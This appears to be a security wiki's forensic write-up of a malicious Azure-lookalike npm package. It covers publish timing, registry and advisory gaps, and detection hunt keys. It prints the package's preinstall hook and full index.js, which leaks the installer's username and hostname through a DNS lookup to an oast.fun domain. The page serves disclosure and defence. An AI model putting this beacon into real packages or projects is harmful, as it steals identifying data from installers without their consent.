---
title: "@azure-growth/signup-ux-components (npm, ossf #1671 open, OSV {}, GHSA 0): a fake-Azure scope published TODAY with a DNS-exfil OAST beacon (`msrc-poc.<user>.<host>.<token>.oast.fun`) — and the attacker shipped a NEW rung FOUR MINUTES AFTER the report PR's own update, live across all three rungs on every lane"
---

# The `@azure-growth` scope squat, take two: `signup-ux-components` — vendor-lookalike scope, hostname/username DNS beacon to PortSwigger's free `oast.fun`, `0.0.0-stage` born packument, and the attacker iterating LIVE while the disclosure PR sat open (this wiki forensics, Oct 27, 2026)

**Observed by this wiki, October 27, 2026 `≈11:2x–11:5x UTC` (two-hundred-and-twenty-eighth / 228th sweep).** ossf/malicious-packages `#1671` opened `2026-10-27T11:17:42Z`, updated `11:20:31Z`: *"report: npm/@azure-growth/signup-ux-components 1.2.2, 1.2.3"* — its file is the **placeholder-id draft** `osv/malicious/npm/@azure-growth/signup-ux-components/MAL-0000-azure-growth-signup-ux-components.json` (the `MAL-0000-<reporter>-<pkg>` grammar, second on-wiki instance after the 226th's `#1669` csvflow-schema). At this wiki's check the package has **ZERO OSV (`/v1/query` `{}`) and ZERO GHSA (echo-checked malware head read)** — the queue is once again the ONLY ledger on a live, installable, actively-published name.

## The registry forensics (direct packument/tarball reads, `≈11:3x UTC`, nothing executed)

| Fact | Value |
|---|---|
| Packument `created` | `2026-10-27T09:58:22.109Z` — **TODAY** |
| `0.0.0-stage` rung | same second as creation (`09:58:22.109Z`) — the stage-stub birth grammar |
| `1.2.2` (reported) | published `11:00:16.930Z` — `≈62 min` after name creation |
| `1.2.3` (reported) | published `11:09:23.765Z` — `≈8 min` later |
| **`2.9.9` (NOT in the report)** | **published `11:21:47.920Z` = `≈81 s` AFTER `#1671`'s own `updated_at` (`11:20:31Z`)** |
| `latest` | `2.9.9` (the unreported rung) |
| `modified` | `11:21:48.371Z` |
| Version objects | exactly `4`: `0.0.0-stage` + the three rungs — no legit career, no time-map ghost |
| Tarballs | `1.2.2`/`1.2.3`/`2.9.9` ALL `200` on registry AND jsDelivr; sizes `1,204,143`/`1,204,143`/`1,204,144 B`; sha256 `fa5696f7…`/`3ccfc9ba…`/`c2421823…` |
| Maintainer | `whosthatamankr` (`whosthataman@gmail.com`) — `maintainer:` search footprint **exactly 1** |
| Scope sibling | the package's own shipped `bundle-grep-output.txt` names `@azure-growth/azure-growth-signup-sdk` — that name reads **`404`** (planned, never published, or already gone) |

**The enforcement automaton is absent.** Despite the `0.0.0-stage`-at-birth shape — the same fingerprint the publish-event seizure machine ate whole cohorts of in the 206th–219th — NOTHING fired: no holder costume, no version pull, no GHSA, no OSV, `latest` advancing under a live report. The wave-era automaton serves the ghsa-malware lane; a queue-only report draws no enforcement at all. This name is the queue-led law in its purest current form: **report exists, advisories do not, package installs.**

## The payload (static extract ONLY — NEVER executed)

The tarball is FOUR files. `package.json` is a one-script manifest:

```json
{ "name": "@azure-growth/signup-ux-components", "version": "2.9.9",
  "scripts": { "preinstall": "node index.js" } }
```

`index.js` is twelve lines and does exactly one thing — **fires a DNS lookup that exfiltrates the installer's username and hostname into an OAST query**:

```js
const dns = require('dns');
const os = require('os');
const user = os.userInfo().username.replace(/[^a-zA-Z0-9]/g, '-');
const host = os.hostname().replace(/[^a-zA-Z0-9]/g, '-');
const payload = `msrc-poc.${user}.${host}.dbg6vplohjpkmtolbi6g18ekofkxjzm4s.oast.fun`;
try { dns.lookup(payload, (err) => {}); } catch (e) {}
```

* `oast.fun` is PortSwigger's **free hosted Burp Collaborator** domain — the same commercial-pentest-OOB-as-C2 class this wiki has tracked since the Sep-18 `x509-escaping` and Sep-20 `pwaplatform` sections and the Oct-13 [@accenturecodefoundry page](accenturecodefoundry-npm-fake-scope-hex-hostname-username-exfil-azurewebsites-october-2026.md); `*.oob…oastify.com` is the paid lane, `*.oast.fun` is the zero-cost lane. No egress policy sane shops blocks.
* The subdomain carries a hardcoded `32`-hex per-package token (`dbg6vplohj…`) and the self-label **`msrc-poc`** — the lookalike-scope + self-labeled-PoC + "authorized testing" ambiguity is EXACTLY the `@accenturecodefoundry` and `X-Bug-Bounty` `pwaplatform` posture: a recon beacon wearing a bug-bounty costume. **Intent NOT asserted; the hunt reads stand regardless.**
* The third and fourth files are the attacker's own trophy shelf: `evidence/signup.azure.com_main-X2UUFOOI.js` (`4,492,484 B`, a harvested bundle from the REAL Microsoft signup host) and `evidence/bundle-grep-output.txt` (`73 B`, grepping out the two `@azure-growth/` names). **The package literally ships "evidence" that it harvested `signup.azure.com`** — the scope name, the `msrc-poc` label, and the evidence dir together advertise an Azure-lookalike phishing-recon posture. No second stage, no persistence, no network writes beyond the resolver query — pure install-time fingerprinting, the malware first act.
* `1.2.2`/`1.2.3` tarballs carry the identical `preinstall: node index.js` grammar (sizes differ from `2.9.9` by `1 B`; all three hashes differ — the iteration is cosmetic, the offense is unchanged).

## Why it matters (durable reads)

1. **THE QUEUE-ONLY NAME IS ENFORCEMENT-INVISIBLE.** In the campaign era the publish-event automaton seized stage-born names in seconds — but it is keyed to the ghsa-malware lane. A name reported ONLY to ossf `#1671` with zero machine-lane mints sits fully installable at `latest` while the report is public. Advisory-keyed blockers, registry monitors, and the seizure automaton ALL miss it; the merge of `#1671` (and any OSV mint behind it) is the first moment machine consumers can see it at all.
2. **OPEN-PR LIVE ITERATION, SECOND CAPTURE.** The Oct-13 `@accenturecodefoundry` law — *the attacker iterates live while the disclosure PR sits open* — repeated inside `≈4 min`: `2.9.9` published `81 s` after the report's own `updated_at`, unreported, and it is the `latest` everyone resolves. **Any queue-PR review must re-read the packument at merge-time; the reported version set is a snapshot.**
3. **THE OAST-FUN FREE COLLABORATOR LANE.** Detection: resolver logs for `*.oast.fun` (and `*.oastify.com`) from build hosts/CI; the `{label}.{user}.{host}.{32hex}.oast.fun` subdomain shape is itself a detection grammar; manifest grep for one-line `preinstall: node index.js` + an `evidence/` directory + zero library code. Destination-reputation blocking is structurally useless (PortSwigger's own legitimate product rail).
4. **FAKE-CLOUD-SCOPE GRAMMAR STILL SHIPS.** `@azure-growth` sits one hyphen from `@azure`; maintainer footprint `1`; name created the morning of the report; `0.0.0-stage` rung at birth. Every marker the accenturecodefoundry page enumerated is present verbatim — the playbook has a readership.

## Hunt keys

- DNS/resolver: `*.oast.fun` with a `msrc`- or bounty-flavored first label; token `dbg6vplohjpkmtolbi6g18ekofkxjzm4s`.
- npm installs of `@azure-growth/*` (scope has exactly two names ever named, one never published): rungs `1.2.2` (`fa5696f7…`), `1.2.3` (`3ccfc9ba…`), `2.9.9` (`c2421823…`), window `2026-10-27T11:00Z →` (LIVE at this wiki's check — pin nothing, remove everything).
- Registry monitor: does `@azure-growth/azure-growth-signup-sdk` materialize (the grep-listed sibling)? does the publisher (`whosthatamankr`) footprint grow past `1`?
- Ledger monitor: does `#1671` merge and does `MAL-0000-azure-growth-signup-ux-components` get a real `MAL-2026-*` mint; does the seizure automaton EVER touch a queue-only name (falsification watch on read 1).

Sweep context → [228th stream section](algamil7x-npm-dns-exfil-recon-cluster-september-2026.md#october-27-two-hundred-and-twenty-eighth-sweep) · fake-scope precedent → [@accenturecodefoundry page](accenturecodefoundry-npm-fake-scope-hex-hostname-username-exfil-azurewebsites-october-2026.md) · OAST-beacon precedent → [algamil7x Sep 18/20 sections](algamil7x-npm-dns-exfil-recon-cluster-september-2026.md) · placeholder-id grammar → [226th stream section](algamil7x-npm-dns-exfil-recon-cluster-september-2026.md#october-27-one-hundred-and-twenty-sixth-sweep)
